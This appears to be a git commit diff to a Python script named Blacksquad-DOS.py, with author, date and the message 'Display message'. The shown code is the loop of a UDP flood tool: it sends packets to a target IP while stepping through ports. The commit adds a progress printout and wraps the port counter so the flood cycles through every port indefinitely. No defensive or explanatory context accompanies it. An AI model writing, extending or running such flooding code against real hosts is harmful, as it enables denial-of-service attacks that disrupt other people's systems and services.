49f39bbc9ae85f09f11af9ea22eea6bf1feb2c88
Ngulefac <ngulefacfolefac@gmail.com>
2021-03-09 19:54:40 +0100

    Display message

--- Blacksquad-DOS.py
+++ Blacksquad-DOS.py
@@ -47,3 +47,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
